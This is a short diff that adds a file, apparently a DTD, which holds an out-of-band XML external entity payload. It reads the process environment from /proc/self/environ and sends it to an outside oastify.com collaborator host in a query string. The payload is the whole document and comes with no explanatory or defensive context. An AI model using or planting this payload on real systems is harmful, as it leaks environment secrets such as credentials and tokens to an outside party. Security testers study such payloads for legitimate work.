@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///proc/self/environ">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://wrrgnl3bjajb1ps5dpk66hhwzn5et4ht.oastify.com/?exf-host=%file;'>">
+%eval;
+%exfil;
